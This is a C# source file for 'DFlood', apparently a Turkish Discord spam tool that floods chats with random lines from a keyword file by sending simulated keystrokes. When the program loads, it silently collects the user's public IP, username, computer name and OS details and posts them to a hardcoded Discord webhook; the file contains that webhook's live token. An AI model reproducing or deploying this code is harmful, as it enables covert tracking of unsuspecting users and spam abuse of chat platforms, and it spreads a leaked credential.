//coded by wés <3
using DFlood.DFLoodDiscordRPC;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace DFlood
{
    public partial class main : Form
    {
        public main()
        {
            InitializeComponent();
        }

        private int topMostCounter, startStopCounter, messageCounter, nextWord, keyWordsCount, topTimeFloods;
        private int messageSendInterval = 1, min = 2, max = 6, floodCount = 30;
        private int bootDeleteAfter = 0, bootScr = 0, bootTp = 0, bootUnlmtd = 0, bootDeleteInt = 0;
        private System.Media.SoundPlayer snd = new SoundPlayer();
        private Random rnd = new Random();
        private OpenFileDialog ofd = new OpenFileDialog();
        private OperatingSystem OS = System.Environment.OSVersion;
        private DateTime today = DateTime.Now;

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        [DllImportAttribute("User32.dll")]
        private static extern int FindWindow(String ClassName, String WindowName);

        [DllImportAttribute("User32.dll")]
        private static extern IntPtr SetForegroundWindow(int hWnd);

        private static void sendWebHook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    Username
                },
                {
                    "content",
                    msg
                }
            });
        }

        private void Alert(string msg, Form_Alert.enmType type)
        {
            Form_Alert frm = new Form_Alert();
            frm.showAlert(msg, type);
        }

        private void formMover_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void DFloodDiscordRPCClient()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.presence.details = "DFlood Discord Trainer";
            this.presence.state = "Main Menu";
            this.presence.largeImageKey = "logo";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "DFlood Spam Trainer";
            this.presence.smallImageText = "Suan Aktif!";
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        public async Task Announce() // 1
        {
            DiscordSocketClient _client = new DiscordSocketClient(); // 2
            ulong id = 852884362449387535; // 3
            var chnl = _client.GetChannel(id) as IMessageChannel; // 4
            await chnl.SendMessageAsync("Announcement!"); // 5
        }

        private void GetPersonalUserSettings()
        {
            secureMode.Checked = Properties.Settings.Default.IsSecureMode;
            unlimitedFlood.Checked = Properties.Settings.Default.IsUnlimitedFlood;
            topMost.Checked = Properties.Settings.Default.IsTopMost;
            deleteAfter.Checked = Properties.Settings.Default.IsDeleteAfter;
            txtMessageSenderIntervalMax.Value = Properties.Settings.Default.MaxInvertal;
            txtMessageSenderIntervalMin.Value = Properties.Settings.Default.MinInterval;
            txtFloodCount.Value = Properties.Settings.Default.FloodNumber;
            messageDeleteInterval.Value = Properties.Settings.Default.msgDeleteInterval;
            topTimeFloods = Properties.Settings.Default.GetTopFloodNumber;
            min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
            max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
        }

        private void SavePersonalUserSettings()
        {
            Properties.Settings.Default.IsSecureMode = secureMode.Checked;
            Properties.Settings.Default.IsUnlimitedFlood = unlimitedFlood.Checked;
            Properties.Settings.Default.IsTopMost = topMost.Checked;
            Properties.Settings.Default.IsDeleteAfter = deleteAfter.Checked;
            Properties.Settings.Default.MinInterval = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
            Properties.Settings.Default.MaxInvertal = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
            Properties.Settings.Default.msgDeleteInterval = Convert.ToInt16(messageDeleteInterval.Value);
            Properties.Settings.Default.FloodNumber = Convert.ToInt16(txtFloodCount.Value);
            Properties.Settings.Default.GetTopFloodNumber = topTimeFloods;
            min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
            max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
            Properties.Settings.Default.Save();
        }

        private void FloodService()
        {
            min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
            max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);

            keyWordsCount = keywords.Items.Count;
            nextWord = rnd.Next(0, keyWordsCount);
            keywords.SelectedIndex = nextWord;

            SendKeys.Send(keywords.SelectedItem.ToString());
            SendKeys.Send("{ENTER}");

            messageCounter = messageCounter + 1;
            messageSendInterval = rnd.Next(min, max);

            topTimeFloods = topTimeFloods + 1;
        }

        private void MessageDeleteEventListener()
        {
            SendKeys.Send("{UP}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("^(a)");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{BACKSPACE}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{ENTER}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{ENTER}");
        }

        private void messageTimer_Tick(object sender, EventArgs e)
        {
            messageSendInterval = messageSendInterval - 1;

            if (messageSendInterval == 0)
            {
                if (unlimitedFlood.Checked == true)
                {
                    if (deleteAfter.Checked == true)
                    {
                        MessageDeleteEventListener();
                        FloodService();
                    }
                    else
                    {
                        FloodService();
                    }
                }

                if (unlimitedFlood.Checked == false)
                {
                    floodCount = floodCount + 1;
                    if (floodCount == txtFloodCount.Value)
                    {
                        messageTimer.Stop();
                    }

                    if (deleteAfter.Checked == true)
                    {
                        MessageDeleteEventListener();
                        FloodService();
                    }
                    else
                    {
                        FloodService();
                    }
                }
            }
        }

        private void deleteAfter_CheckedChanged(object sender, EventArgs e)
        {
            bootDeleteAfter = bootDeleteAfter + 1;
            if (bootDeleteAfter > 1)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();

                if (deleteAfter.Checked == true)
                {
                    messageDeleteInterval.Enabled = true;
                    this.Alert("Enabled", Form_Alert.enmType.Success);
                }
                else if (deleteAfter.Checked == false)
                {
                    messageDeleteInterval.Enabled = false;
                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                }
            }
        }

        private void messageDeleteTimer_Tick(object sender, EventArgs e)
        {
            MessageDeleteEventListener();
        }

        private void messageRefreshTime_MouseUp(object sender, MouseEventArgs e)
        {
            tmrVirusTotal.Stop();
            messageRefreshTime.Value = 0;
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            SavePersonalUserSettings();
            Application.Exit();
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        [Obsolete]
        private void main_Load(object sender, EventArgs e)
        {
            var webClient = new WebClient();
            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
            webClient.Dispose();
            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
            var ipadress = $"**IP Adresi : ** {dnsString}";
            var day = $"**Giriş Günü : ** {today.DayOfWeek}";
            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
            var platform = $"**Platform : ** {OS.Platform.ToString()}";
            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";

            sendWebHook("https://discord.com/api/webhooks/852885246734630994/MonkHE1WaU2REVn8U77Z7einRLTmwovO9PKr9Es9pFCmdXeqcCmW_jpIVx-mfNOfDOFI", $"**DFlood Trainer'e Yeni Giriş Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
            DFloodDiscordRPCClient();
            GetPersonalUserSettings();

            if (deleteAfter.Checked == false)
            {
                messageDeleteInterval.Enabled = false;
            }

            if (secureMode.Checked == true)
            {
                txtMessageSenderIntervalMin.Enabled = false;
                txtMessageSenderIntervalMax.Enabled = false;
                txtFloodCount.Enabled = false;
                unlimitedFlood.Enabled = false;
                deleteAfter.Checked = true;
                deleteAfter.Enabled = false;
                messageDeleteInterval.Enabled = false;
            }

            if (topMost.Checked == true)
            {
                this.TopMost = true;
                topMostCounter = 1;
            }

            if (unlimitedFlood.Checked == true)
            {
                txtFloodCount.Enabled = false;
            }
        }

        private void messageRefreshTime_MouseDown(object sender, MouseEventArgs e)
        {
            tmrVirusTotal.Start();
        }

        private void secureMode_CheckedChanged(object sender, EventArgs e)
        {
            bootScr = bootScr + 1;
            if (bootScr > 1)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();
                if (secureMode.Checked == true)
                {
                    bootDeleteAfter = 0;
                    bootTp = 0;
                    bootUnlmtd = 0;
                    this.Alert("Enabled", Form_Alert.enmType.Success);

                    txtMessageSenderIntervalMin.Enabled = false;
                    txtMessageSenderIntervalMax.Enabled = false;
                    txtFloodCount.Enabled = false;
                    unlimitedFlood.Enabled = false;
                    deleteAfter.Checked = true;
                    deleteAfter.Enabled = false;
                    messageDeleteInterval.Enabled = false;

                    bootDeleteAfter = 1;
                    bootTp = 1;
                    bootUnlmtd = 1;
                }
                else if (secureMode.Checked == false)
                {
                    bootDeleteAfter = 0;
                    bootTp = 0;
                    bootUnlmtd = 0;

                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                    txtMessageSenderIntervalMin.Enabled = true;
                    txtMessageSenderIntervalMax.Enabled = true;
                    txtFloodCount.Enabled = true;
                    messageDeleteInterval.Enabled = true;
                    unlimitedFlood.Enabled = true;
                    deleteAfter.Checked = false;
                    deleteAfter.Enabled = true;

                    bootDeleteAfter = 1;
                    bootTp = 1;
                    bootUnlmtd = 1;
                }
            }
        }

        private void txtMessageSenderIntervalMax_ValueChanged(object sender, EventArgs e)
        {
            max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
        }

        private void messageDeleteInterval_ValueChanged(object sender, EventArgs e)
        {
            SavePersonalUserSettings();
            bootDeleteInt = bootDeleteInt + 1;
            if (bootDeleteInt > 1)
            {
                messageDeleteTimer.Interval = Convert.ToInt16(messageDeleteInterval.Value) * 1000;
            }
        }

        private void txtMessageSenderIntervalMin_ValueChanged(object sender, EventArgs e)
        {
            min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
        }

        private void btnStartService_Click(object sender, EventArgs e)
        {
            startStopCounter = startStopCounter + 1;
            if (startStopCounter % 2 == 1)
            {
                messageCounter = 0;
                messageRefreshTime.Value = 1000;
                snd.SoundLocation = "openSound.wav";
                btnStartService.Text = "Hizmeti Durdur";
                snd.Play();
                txtMessageSenderIntervalMin.Enabled = false;
                txtMessageSenderIntervalMax.Enabled = false;
                txtFilePath.Enabled = false;
                txtFloodCount.Enabled = false;
                btnImport.Enabled = false;
                secureMode.Enabled = false;
                unlimitedFlood.Enabled = false;
                topMost.Enabled = false;
                deleteAfter.Enabled = false;
                messageDeleteInterval.Enabled = false;
                messageRefreshTime.Enabled = false;
                messageTimer.Start();
                this.Alert("Flood Service Started", Form_Alert.enmType.Success);
            }
            else if (startStopCounter % 2 == 0)
            {
                snd.SoundLocation = "success.wav";
                btnStartService.Text = "Hizmeti Başlat";
                snd.Play();
                txtMessageSenderIntervalMin.Enabled = true;
                txtMessageSenderIntervalMax.Enabled = true;
                txtFilePath.Enabled = false;
                txtFloodCount.Enabled = true;
                btnImport.Enabled = true;
                secureMode.Enabled = true;
                unlimitedFlood.Enabled = true;
                topMost.Enabled = true;
                deleteAfter.Enabled = true;
                messageDeleteInterval.Enabled = true;
                messageRefreshTime.Enabled = true;
                this.Alert("Flood Service Stopped", Form_Alert.enmType.Warning);
                messageRefreshTime.Value = 0;
                messageCounter = 0;
                startStopCounter = 0;
                messageTimer.Stop();
            }
        }

        private void btnImport_Click(object sender, EventArgs e)
        {
            ofd.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            ofd.FilterIndex = 1;
            ofd.InitialDirectory = "c:\\";
            ofd.RestoreDirectory = true;

            snd.SoundLocation = "openSound.wav";
            snd.Play();
            DialogResult reply = ofd.ShowDialog();
            if (reply == DialogResult.OK)
            {
                keywords.Items.Clear();
                StreamReader oku = new StreamReader(ofd.FileName);
                string satir = oku.ReadLine();
                while (satir != null)
                {
                    keywords.Items.Add(satir);
                    satir = oku.ReadLine();
                }
                snd.SoundLocation = "success.wav";
                snd.Play();
                btnStartService.Enabled = true;
                this.Alert($"Import Successfully", Form_Alert.enmType.Success);

                txtFilePath.Text = ofd.FileName;
            }
            else if (reply == DialogResult.Cancel)
            {
                txtFilePath.Enabled = false;
                btnStartService.Enabled = false;
            }
        }

        private void topMost_CheckedChanged(object sender, EventArgs e)
        {
            bootTp = bootTp + 1;
            if (bootTp > 1)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();

                topMostCounter = topMostCounter + 1;

                if (topMostCounter % 2 == 1)
                {
                    this.TopMost = true;
                    this.Alert("Enabled", Form_Alert.enmType.Success);
                }
                else
                {
                    this.TopMost = false;
                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                }
            }
        }

        private void unlimitedFlood_CheckedChanged(object sender, EventArgs e)
        {
            bootUnlmtd = bootUnlmtd + 1;
            if (bootUnlmtd > 1)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();

                if (unlimitedFlood.Checked == false)
                {
                    this.Alert("Disabled", Form_Alert.enmType.Warning);
                    floodCount = Convert.ToInt16(txtFloodCount.Value);
                    txtFloodCount.Enabled = true;
                }
                else
                {
                    this.Alert("Enabled", Form_Alert.enmType.Success);
                    txtFloodCount.Enabled = false;
                }
            }
        }

        private void txtFilePath_TextChanged(object sender, EventArgs e)
        {
            if (txtFilePath.TextLength == 0)
                btnStartService.Enabled = false;
            else
                btnStartService.Enabled = true;
        }

        private void tmrVirusTotal_Tick(object sender, EventArgs e)
        {
            messageRefreshTime.Value += 10;
            if (messageRefreshTime.Value == 800)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();
            }
            if (messageRefreshTime.Value == 1000)
            {
                messageRefreshTime.Value = 0;
                tmrVirusTotal.Stop();
                Process.Start("https://www.virustotal.com/gui/file/705cecacf1a29216e0f25c57537d42a566618f43b551c4f59b722ae7c8718a5e/detection");
            }
        }
    }
}